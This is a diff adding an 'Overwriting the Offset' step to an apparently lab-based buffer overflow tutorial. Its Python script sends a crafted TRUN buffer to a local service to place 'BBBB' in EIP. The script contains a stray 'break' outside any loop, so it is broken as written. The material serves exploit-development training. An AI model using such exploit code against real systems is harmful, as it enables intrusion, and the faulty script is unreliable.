@@ -176,3 +176,48 @@ If everything is correct, when you run the above command, you should get an exac
 
 Ensure that you write down this offset match.
 
+## Overwriting the Offset
+This step will help you ensure that you can control the EIP. If you are successful, you will observe 4 "B" characters within the EIP space(42424242, 42 = B hexidecimal) (Based off of the script code)
+1. Restart Immunity + the Exe and attach as you did previously.
+2. Edit the provided python script to test your offset
+
+```python
+import socket
+from time import sleep
+
+ip = "127.0.0.1"
+port = 9999
+
+fuzzBuffer = "A"
+buffer = ""
+command = "TRUN /.:/"
+
+print(f"[*] Connecting to {ip,port}")
+
+buffer = command    
+buffer += fuzzBuffer * 2003 + "B" * 4 + "C" * 100 + '\r\n'
+
+print(f"Sending payload, Buffer len: {len(buffer)}")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+try:
+    conn = s.connect((ip, port))
+    recv = s.recv(1024)
+    s.send(buffer.encode("latin-1"))
+except:
+    s.close()
+    print(f"Program Crashed Buffer Length: {len(buffer)}")
+    break
+```
+
+3. Replace "2003" with your offset value found, replace the IP, port, and command with your values (as needed).
+4. Run the script
+```console
+python offset.py
+```
+
+5. You should now observe 4 "B characters" represented by 42424242 written to the EIP.
+![](/assets/images/EIP2.png)
+
+6. You now control the EIP. Good job!
+
